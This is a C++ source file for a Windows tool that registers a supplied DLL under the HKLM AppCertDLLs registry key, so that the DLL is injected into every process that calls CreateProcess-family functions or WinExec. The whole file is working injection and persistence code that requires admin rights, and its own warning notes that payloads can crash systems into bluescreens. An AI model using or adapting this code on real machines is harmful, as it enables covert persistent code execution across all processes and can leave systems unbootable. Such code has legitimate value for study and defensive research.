/**
* Injects a .dll into every process that calls: CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec by writing it to the AppCertDLLs registry key.
* Supports 32- and 64 Bit applications.
* [Requirements] 
*	- elevated priviledges
* [WARNING]
*	Some dll payloads (such as the one in this project) may couse a CRITICAL_PROCESS_DIED bluescreens, even with safe mode enabled.
*	The easiest way to fix the system in such a case is to delete the .dll file on disk. This can for example be done by booting into the commandline only environment.
*/

#include <Windows.h>
#include <iostream>


bool IsElevated()
{
	HANDLE tokenHandle = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
	{
		return false;
	}

	TOKEN_ELEVATION tokenInformation;
	DWORD returnLength;
	if (!GetTokenInformation(tokenHandle, TokenElevation, &tokenInformation, sizeof(tokenInformation), &returnLength))
	{
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return tokenInformation.TokenIsElevated;
}

bool IsOsVersionBelowWindows8()
{
	using fnRtlGetVersion = NTSTATUS(NTAPI*)(PRTL_OSVERSIONINFOW lpVersionInformation);

	HMODULE ntdllHandle = GetModuleHandleA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Warning] %d - Failed to get ntdll handle\n", GetLastError());
		return false;
	}

	fnRtlGetVersion RtlGetVersion = (fnRtlGetVersion)GetProcAddress(ntdllHandle, "RtlGetVersion");

	RTL_OSVERSIONINFOW osInfo;
	RtlGetVersion(&osInfo);
	return osInfo.dwMajorVersion < 8 ? true : false;
}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe dllPath\n");
		return 1;
	}

	if (!IsElevated())
	{
		printf("[Error] - Writing AppInit_DLLs requires elevated privileges\n");
		return 1;
	}

	HKEY keyHandle;
	RegCreateKeyA(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", &keyHandle);
	if (!keyHandle)
	{
		printf("[Error] - Failed to create/open registry key\n");
		return 1;
	}

	char absoluteDllPath[MAX_PATH + 1];
	GetFullPathNameA(argv[1], MAX_PATH + 1, absoluteDllPath, NULL);
	if (RegSetValueExA(keyHandle, "appcertdllInjection", 0, REG_SZ, (const BYTE*)absoluteDllPath, strlen(absoluteDllPath) + 1) != ERROR_SUCCESS)
	{
		printf("[Error] - Failed to write dll path to AppCertDLLs\n");
		return 1;
	}

	printf("[Info] - Wrote AppCertDLLs registry key\n");

	return 0;
}